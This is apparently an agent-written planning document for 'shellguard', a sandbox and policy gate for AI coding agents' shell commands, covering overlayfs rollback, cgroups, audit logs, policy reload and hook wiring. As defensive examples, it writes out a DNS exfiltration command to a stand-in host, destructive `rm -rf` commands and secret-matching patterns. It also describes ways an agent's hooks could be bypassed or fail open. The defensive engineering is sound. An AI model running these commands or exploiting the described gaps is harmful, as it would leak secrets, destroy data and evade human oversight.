# Closing the gaps

This is the answer to two lists: the known limitations in [EXPLAIN.md](EXPLAIN.md#what-it-cant-do-yet)
/ [DESIGN.md](DESIGN.md) §12, and the risks raised against the three pieces
recommended for this session (Bash-hook wiring, an audit log, policy
hot-reload).

Each entry follows the same shape: **the gap**, **the fix**, and **how we'd
know it actually worked** — because a fix nobody verified is just a
differently-shaped version of the same problem this project keeps calling out
in other tools.

Nothing here is built yet. This is the "how", written before the "do it".

---

## Part 1 — the limitations already on record

### 1. Overlayfs rollback is unimplemented

**The fix.** Add `crates/shellguard-runtime/src/overlay.rs`: mount the
workspace read-only as `lowerdir`, point `upperdir`/`workdir` at a scratch
directory, and hand the command the merged mount as its working tree.
Rollback becomes `umount` + delete the upper directory — no git object
database involved. Detect availability by checking `/proc/filesystems` for
`overlay` and probing an actual mount in a throwaway temp dir at startup; fall
back to the existing git-based `StateManager` when either check fails. For
hosts without `CAP_SYS_ADMIN` (containers, non-root agents), fall back further
to `fuse-overlayfs` before giving up on overlay entirely.

**How we'd know.** This only runs on Linux, and this session has no Linux
host. Verification has to happen on a real Linux runner — a GitHub Actions
`ubuntu-latest` job that mounts a real overlay, runs the existing rollback
test suite (`rollback_restores_a_modified_tracked_file` and friends) against
the overlay backend instead of the git backend, and only then does DESIGN.md
get to stop saying "unimplemented."

### 2. The warm pool isn't wired to a VM backend

**The fix.** Implement the `Warm` trait for `VzRuntime`: `boot()` launches
`vzrunner` in `run` mode against a guest image and blocks on the vsock
handshake already specified by `GUEST_PROTOCOL`; `healthy()` pings it;
`shutdown()` sends a graceful stop. The missing piece isn't code, it's a
guest: rather than pulling a third-party VM image (a supply-chain risk in its
own right), build a minimal one from source — a statically-linked Rust agent
implementing `GUEST_PROTOCOL`, packed into an initramfs with BusyBox, booted
under a small, checksum-verified kernel from a trusted distro package (e.g.
Alpine's `linux-virt`). Everything except the kernel binary itself is
something we compile, so provenance is ours end to end.

**How we'd know.** A `pool` integration test that leases a guest, runs a
trivial command through it, confirms `warm_hits` incremented and `cold_boots`
did not, and measures acquisition latency against the 200ms target — the
actual number the design has been honest about not yet meeting.

**Needs your sign-off first.** Even a minimal kernel is a binary download.
I'd name the exact package, its checksum, and its source before pulling
anything.

### 3. Landlock does not survive into gVisor

**Status: the parity half is built and verified; the other half is dropped, with
a reason.** Design and findings are in
[DESIGN.md § 8](DESIGN.md#on-gvisor-and-landlock-inside-the-container).

**Built.** `Profile::fs_grants` is now the one place that decides which host
paths a profile exposes and how far. Seatbelt, Landlock and the gVisor mount set
each translate it and derive nothing of their own. Writing the parity test first
and watching it fail showed the drift was real, not hypothetical: gVisor mounted
the workspace `rw` for profiles granting no writes, ignored `read_paths` and
`write_paths`, and offered a writable `/tmp` to profiles with no scratch
directory. All three are fixed.

**Dropped: Landlock on the `runsc` host process.** The original plan proposed
confining the sentry itself. On reflection it cannot be built responsibly here:

- `runsc` legitimately needs to create namespaces, mount, `pivot_root`, set up
  cgroups and reach `/proc` and `/dev/kvm`. A Landlock ruleset around it has to
  allow everything it touches, and I cannot enumerate that without running it.
- Get it wrong and the failure is a launch path that never works, or — worse —
  a ruleset loosened until it protects nothing while the docs claim it does.
- gVisor documents that it already confines its own sentry and gofer with
  namespaces and seccomp. I have not verified that here.

Revisit with a Linux host, where `runsc` can be traced (`strace`) to see what a
ruleset would have to allow. Until then this is recorded as a proposal, not a
control.

**What is still unverified**: the Landlock loop has never run (it type-checks for
both Linux architectures), and no bundle has been given to `runsc`.

The original plan for this entry follows, unchanged, for the record.

**This one isn't fixable — `runsc` genuinely doesn't implement
`landlock_create_ruleset`.** The honest move isn't a workaround that pretends
otherwise; it's strengthening the compensating control that's already there
and making sure it doesn't quietly drift from what Landlock would have
granted.

**The fix.** Two additions, not a substitute for the gap:
- Apply Landlock **to the `runsc` host process itself** — not the guest, but
  the sentry that's mediating the guest's syscalls. If the sentry is ever
  compromised, its own reach on the host is still bounded.
- A parity test: given a `Profile`, assert that the Landlock rights it would
  grant on native Linux and the OCI mount set it produces for gVisor describe
  the *same* readable/writable paths. Today that equivalence is asserted in a
  doc comment; it should be asserted in a test that fails the build if the two
  code paths drift apart.

**How we'd know.** The parity test passing on every commit, plus a one-line
addition to DESIGN.md §12 making the mitigation — not the absence of the
gap — explicit.

### 4. No audit log

**Status: built and verified.** Design and measurements are in
[DESIGN.md § 14](DESIGN.md#14-the-audit-log); this entry and items 15–17 are one
piece of work.

What was built: `audit.rs` and `redact.rs` in `shellguard-runtime`, wired into
the engine (two-phase `start`/`finish`), the C ABI (`sg_engine_set_audit`,
`sg_engine_audit_failures`), the CLI (`--audit`, `--audit-verbose`,
`--audit-required`, `--audit-max-bytes`, `--audit-keep`, `$SHELLGUARD_AUDIT`) and
Python (`audit_log=`, `audit_verbose=`, `audit_required=`).

What remains true of it, stated plainly: it is **not tamper-evident** (no hash
chain), and it records only what goes through the engine.

### 5. No cgroups

**The fix.** `crates/shellguard-enforce/src/linux/cgroup.rs`. Before the
child is spawned, create a per-execution cgroup under a shellguard-owned
parent (`/sys/fs/cgroup/shellguard/<exec-id>/`), write `memory.max`,
`pids.max`, and `cpu.max` from a new `ResourceLimits` struct (defaults: 512MB,
64 PIDs, one core), and place the child into it. Placement happens
immediately after `fork`, in the same `pre_exec` window that already applies
the seccomp filter and Landlock ruleset — one more `write()` alongside syscalls
already being made there, not a new architectural seam. Teardown removes the
cgroup once the kernel reports it empty.

Note this doesn't collide with denying `clone3` in the sandboxed child's own
seccomp filter (`shellguard-enforce/src/syscalls.rs`) — that filter applies to
the *child*, and cgroup placement happens in the *parent*, before the filter
is even installed.

**How we'd know.** A test that sets `memory.max` low, runs a command that
allocates past it, and asserts the OOM killer (not a `RuntimeError`) is what
stops it — the same "the confinement is real, not decorative" pattern already
used for the filesystem tests in `local.rs`.

### 6. No policy hot-reload

**Status: built and verified.** Design, limits and measurements are in
[DESIGN.md § 15](DESIGN.md#15-reloading-the-policy).

Built as planned: the policy sits behind `RwLock<Arc<…>>` (std only), every
evaluation takes one snapshot and keeps it, reload is explicit and takes text,
and text is parsed and compiled in full before anything swaps. A bad file never
replaces a good policy — verified by a test that breaks exactly that and fails.

Where it went beyond or away from the plan, and why:

- **No `shellguard reload` / SIGHUP / `serve` daemon.** There is no daemon: the
  CLI is one process per invocation and reads its policy fresh each time, so it
  has nothing to reload. Reload is an API for long-lived embedders (Rust, C,
  Python).
- **A weakening guard, not planned.** A file cut short by a failed write parses
  as a valid, smaller policy, so "a malformed file is rejected" does not cover
  the scenario that motivated the item. Reload now diffs against what it replaces
  and refuses a change that lowers protection unless told otherwise. Tested by
  cutting the real built-in policy at every line.
- **Fingerprints on decisions**, so a refusal can be tied to the rules that made
  it once rules can change.
- **Duplicate rule ids are rejected by the parser.** A block pasted twice had
  already got into the built-in policy once; a live reload has no unit test in
  the loop to catch it.
- Found on the way: `shellguard run` silently ignored `--policy` (fixed).

### 7. Three of four backends are unverified end to end

**The fix.** One guest build (from item 2), reused across all three:

| Backend | What's missing | Where it can actually be checked |
|---|---|---|
| gVisor | Nothing but the check itself — `runsc` needs no VM image, just the host kernel | A Linux CI job: install `runsc`, run the existing `oci_config()` output against a BusyBox rootfs, assert a write outside the bind mount fails |
| VZ | A bootable guest | This machine — it's already Darwin. Highest-leverage one to close first |
| Firecracker | A bootable guest + `/dev/kvm` | A Linux CI runner with nested virtualization enabled |

**How we'd know.** Each backend's `availability()` stops returning
`Unavailable` only once its own integration test has watched a real command
execute inside it and return real output — not before.

---

## Part 2 — new risks in the three pieces this session proposed

### 8. Eval-only hook wiring is a false sense of security

**The fix — reject the eval-only shape entirely.** `shellguard eval` judges;
it doesn't confine or checkpoint. Two real options, not one:

- **(a) Tool substitution.** A local MCP server wrapping the engine
  (`sg_engine_execute_json` under the hood) becomes the only path an agent has
  to run shell — the raw `Bash` tool is blocked by hook, full stop, and
  everything routes through `run`, not just `eval`.
- **(b) Process-tree confinement.** Launch the whole `claude` process itself
  under a Seatbelt/Landlock profile (or under `shellguard run` as its own
  parent), so the kernel constrains every syscall the CLI makes — Bash, Edit,
  Write, any MCP tool — regardless of which internal tool triggered it.

(b) is the structurally sound one: it doesn't depend on Claude Code's hook
semantics at all, and it closes item 10 for free. (a) is complementary where
you want the specific UX of a verdict, a reason, and an audit trail per
command rather than a silent kernel denial.

**How we'd know.** A red-team test: a command that a hook-only integration
would let through unconfined (because it never got checkpointed or caged) is
attempted against the wired system, and the assertion is that it *cannot*
write outside the workspace even when the verdict was `allow`.

### 9. Fail-open on hook malfunction

**The fix.** First, resolve the actual unknown rather than build around a
guess — check Claude Code's documented hook exit-code semantics before
wiring anything. Then, independent of what the default turns out to be, make
the hook script itself fail closed explicitly: any error invoking
`shellguard` — binary missing, timeout, unexpected exit — is treated as
`deny` inside the script, so the harness's default never gets a chance to
matter.

**How we'd know.** A test that deletes the `shellguard` binary mid-session
and confirms the next Bash call is blocked, not silently allowed.

### 10. Hook only covers the Bash tool

Same fix as item 8(b) — process-tree confinement constrains every syscall the
`claude` process makes, not just the ones behind a Bash tool call.

### 11. Judge/run string mismatch (TOCTOU)

**The fix.** Never re-quote or reconstruct the command between judgment and
execution. Pass the exact bytes Claude Code's Bash tool received as a single
argument or over a length-prefixed pipe — the same wire pattern `vzrunner`
already uses — rather than interpolating into a second shell `-c` string,
which is precisely the double-parse class of bug `unwrap.rs` exists to
defend against on the policy side.

**How we'd know.** A property test: for a corpus of adversarial strings
(embedded quotes, `$()`, newlines, NUL-adjacent bytes), the string judged and
the string executed are asserted byte-identical.

### 12. Env-scrubbing breaks legitimate workflows

**The fix.** This is intended behavior, not a bug — the risk is *silent*
breakage, not the scrubbing itself. Mitigate the silence: detect the common
failure signatures (git credential-helper errors, npm auth failures) and
append a specific hint to stderr rather than a bare non-zero exit. Longer
term, make the existing `payload.env` passthrough (already in `local.rs`) an
explicit, named, per-workspace allowlist rather than something only reachable
through the Rust API today.

**How we'd know.** A test asserting a command that fails for a missing env
var produces a stderr message naming the likely cause, not just a raw
tool error.

### 13. Per-call process spawn cost

**The fix.** Don't spawn `shellguard` fresh per Bash call. Run a long-lived
`shellguard serve` daemon over a Unix socket, wrapping the same `Gate` +
`Worker` the in-process benchmark already measures at 2.8 µs p50 — the
`Worker` type exists specifically to be reused across evaluations, per its
own doc comment. The hook becomes a thin socket client, and the µs numbers
stop being an in-process-only claim.

**How we'd know.** A bench comparing hook-mediated latency against the daemon
against the current cold-spawn baseline, published rather than asserted.

### 14. `settings.json` is an unaudited trust root

**The fix.** Two layers. The audit log (item 8/4) records at startup whether
hook wiring is even active, so a silently-removed hook shows up as a gap in
the record instead of nothing. More importantly, option 8(b) — process-tree
confinement — doesn't depend on `.claude/settings.json` existing at all; the
kernel-level cage stays in place even if the hook config is stripped.

**How we'd know.** A test that removes the hook config and confirms the
process-tree confinement (if built) still blocks the same command the hook
would have.

### 15–17. Audit log: secrets at rest, unbounded growth, false completeness

**Status: all three built and verified** — see item 4.

- *Secrets at rest* — output is off by default; command text is redacted, and
  redaction runs before truncation. Tested that credentials never reach the
  file through the library, the C ABI, the CLI and Python. The redactor is
  best-effort and says so.
- *Unbounded growth* — size rotation, safe across processes: 60 concurrent
  processes with rotation forced mid-run lost, repeated and tore nothing.
- *False completeness* — every file's header states its coverage, and a failed
  write is counted and reported rather than hidden.

The original plan for this entry follows, unchanged, for the record.

**The fix, per risk:**
- **Secrets at rest** — log verdict, findings, timing, and rollback reasons by
  default; full stdout/stderr capture is opt-in (`--audit-verbose`), and even
  then passes through a redaction pass matching common secret shapes (`AKIA…`,
  `ghp_…`, `KEY=`/`TOKEN=`/`SECRET=` assignments) before being written.
- **Unbounded growth** — size- or day-based rotation in the log writer itself,
  keeping the last N files, the same shape as `logrotate`.
- **False completeness** — each log file's own header states which entry
  points were active when it was written, so "the log is quiet" and "the log
  has no coverage here" stay distinguishable.

**How we'd know.** A test asserting a command containing an obvious
credential pattern never appears verbatim in the log; a test asserting
rotation triggers at the configured size; a test asserting the header
correctly reflects which integration points were live.

### 18–19. Policy hot-reload: fail-open, unreviewed live control

**Status: built and verified**, with one deliberate difference from the plan.

- *Fail-open* — a bad reload never replaces the active policy (item 6).
- *Unreviewed live control* — reload takes the policy **text**; there is no path
  parameter at all, in the C ABI or in Python (`reload_policy` raises `TypeError`
  on anything but `str`). The planned "text-only mode" as a compile-time switch
  became the only mode, which makes the planned test moot. On top of that, a
  weakening change is refused unless `allow_weakening` is passed, and every
  attempt — applied or refused — is written to the audit log with the SHA-256 of
  the text offered.

What remains process rather than code, as the original entry said: who is allowed
to call reload, and the permissions on the file the embedder reads the text from.

The original plan for this entry follows, unchanged, for the record.

Fail-open is covered by item 6's core design — a bad reload never replaces
the active policy. The second risk, that the policy file becomes a live
control with no review gate, is process rather than code: treat
`policies/default.policy` file permissions as a security boundary in its own
right (not group- or world-writable), and, if reload is exposed over the FFI,
require the caller to supply the new text rather than a path, so embedding
applications can put their own review step in front of it instead of trusting
whatever's on disk at reload time.

**How we'd know.** A test confirming `sg_engine_reload_policy` rejects a path
argument if the FFI is built in "text-only" mode — a compile-time choice
embedders can make.

### 20. The irreducible risk: the gate can be wrong, a kernel bug is a full escape, rollback doesn't undo side effects

**Status: the verification task is built and macOS is verified; the answer it gave
is uncomfortable, and the fix that remains is a decision rather than code.** Design and
evidence are in [DESIGN.md § 16](DESIGN.md#16-what-stops-a-command-from-sending-data-out).

Built: `tests/exfiltration.txt` and its harness, with three classes (`blocked`,
`granted`, `sandbox`); a check that a profile has network *only* when the decision
names a network capability; and containment tests that run the loopback-targeted
commands against the real macOS sandbox, each with an unsandboxed control and a
granted-profile control. Deliberately opening the sandbox makes them fail.

Found and fixed while writing it: an unknown program was laundered from `confine`
to `allow` by any allowed neighbour, so `nslookup $(cat secrets.txt).evil.example`
was `allow`; `git remote add` was allowed as inspection; and Landlock denied
`connect` to a profile that had been granted `net.connect`.

**Still open — each needs a decision, not just code:**

| gap | why it is not just fixed |
|---|---|
| Linux: "no network" is TCP only; UDP and Unix sockets are open (read from code, never run) | the fix is a seccomp filter on `socket()`, a user+network namespace, or routing risky commands to gVisor. The first cannot be tested off-Linux; the second fails on hardened kernels |

**Closed since:** the gate follows `cd`. `cd / && rm -rf *` was `confine`,
judged as if it ran in the workspace; it is `deny`. The gate tracks the set of
directories the shell may be in — through `&&`, `||`, `if`, subshells, pipelines,
`pushd`/`popd`, `cd -`, `CDPATH` and symlinks — and says "unknown" where it
cannot follow (aliases, traps, `eval`, dynamic program names, loops and functions
that `cd`). It is checked against real `sh`, `bash`, `zsh` and `dash`: about 400
points in 90 scripts, where every directory a shell really used must be one the
gate considered. Found on the way: `rm -rf link/../x` resolved textually (the
kernel follows `link` first), and `sudo -D / rm …` unwrapped to a program named
`/`. Both fixed. Details in [DESIGN.md § 17](DESIGN.md#17-following-cd).

**Closed since:** `git branch -D` and `git tag -d` were `allow` ("run directly"). Two
predicates (`no-positional`, `flags-within`) let the policy allow a `branch` or `tag`
only when every flag lists, and force/delete flags now `ask`. Git accepts abbreviated
long options (`--del` deletes), which is why it is an allowlist. 98 commands are run
against a real repository with the refs compared before and after
([DESIGN.md § 12](DESIGN.md#12-known-limitations)). The same pass found
`git log --output=<file>` writing files behind an `allow`, now `confine`.

**Closed since:** macOS `mach-lookup` is an allowlist, not a blanket allow. The
keychain server, LaunchServices, the clipboard and the URL agent were reachable from a
sandboxed command; none is now, in the offline profile or the network-granted one.
The list (one service offline, one more with a network grant) was found by running 46
tools and reading the sandbox's own refusals, then removing each entry to see which
were needed. Tests ask the kernel which services are reachable, and a live-internet
test shows the network entry is what makes HTTPS verify. Design and caveats — the list
is per macOS release, and system-proxy discovery is off — are in
[DESIGN.md § 6.1](DESIGN.md#61-macos-seatbelt-and-why-not-endpoint-security).

**Decided and done:** the gate's deadline is now 100 ms, separate from the 10 ms
latency budget it used to share a number with. See DESIGN.md § 5 and § 12 for the
evidence, and for what it does *not* demonstrate.

The compensating controls the original entry describes still stand; this entry now
also measures how far they reach.


**No fix — only stated compensating controls**, because claiming otherwise
would be exactly the kind of dishonesty this document exists to avoid.

- *Gate wrong* → compensated by the kernel cage and the checkpoint, which
  don't depend on the gate having judged correctly; further compensated by
  the audit log making `ask` verdicts reviewable after the fact.
- *Kernel bug = full escape* → compensated by escalating genuinely
  higher-risk commands to VM isolation once a backend is verified (item 7),
  rather than treating the local kernel sandbox as sufficient for everything
  that isn't outright denied.
- *Rollback doesn't undo side effects* (a `curl` that already exfiltrated
  data, an email already sent) → the only real lever is stopping the
  side-effecting command from running at all, which means auditing that
  network access is denied unless a rule explicitly grants the `net`
  capability — a verification task, not new code — and adding a corpus
  category specifically for commands that would exfiltrate if network were
  implicitly available, so that gap can't slip through as merely
  "unclassified."

**How we'd know.** The corpus test suite gains an `exfiltration` category
alongside the existing `allow`/`confine`/`ask`/`deny` ones, and every case in
it is asserted to require explicit `net` capability grant rather than
inheriting it by default.

---

## What this doesn't include

Cost and calendar time. Every "how we'd know" above is a real test or a real
CI job, not a checkbox — some of these (a verified VM backend, in particular)
are genuinely multi-session efforts. This document is the technical shape of
each fix; the implementation plan is where sequencing, effort, and what's in
scope for *this* pass get decided.

Ready to turn a subset of this into that plan whenever you say which pieces
to prioritize.
